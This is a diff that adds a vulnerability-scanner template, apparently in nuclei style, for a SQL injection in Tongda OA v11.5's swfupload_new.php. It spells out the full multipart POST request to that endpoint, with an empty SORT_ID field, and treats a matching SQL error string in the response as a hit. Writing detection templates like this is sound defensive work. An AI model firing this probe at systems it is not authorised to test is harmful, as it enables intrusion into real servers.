@@ -1,0 +1,44 @@
+id: tongda-oa-swfupload-sqli
+brief:
+    title: Tongda OA v11.5 swfupload_new.php - SQL Injection
+    by: SleepingBag945
+    level: high
+    about: There is a SQL injection vulnerability in the swfupload_new.php file of Tongda OA v11.5. An attacker can obtain sensitive information of the server through the vulnerability.
+    label:
+        - tongda
+        - sqli
+        - intrusive
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/general/file_folder/swfupload_new.php'
+      head:
+        Accept-Encoding: gzip
+        Content-Type: multipart/form-data; boundary=----------GFioQpMK0vv2
+      body: |-
+        ------------GFioQpMK0vv2
+        Content-Disposition: form-data; name="ATTACHMENT_ID"
+
+        1
+        ------------GFioQpMK0vv2
+        Content-Disposition: form-data; name="ATTACHMENT_NAME"
+
+        1
+        ------------GFioQpMK0vv2
+        Content-Disposition: form-data; name="FILE_SORT"
+
+        2
+        ------------GFioQpMK0vv2
+        Content-Disposition: form-data; name="SORT_ID"
+
+        ------------GFioQpMK0vv2--
+      signs:
+        - "on": word
+          has:
+            - insert into FILE_CONTENT(
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
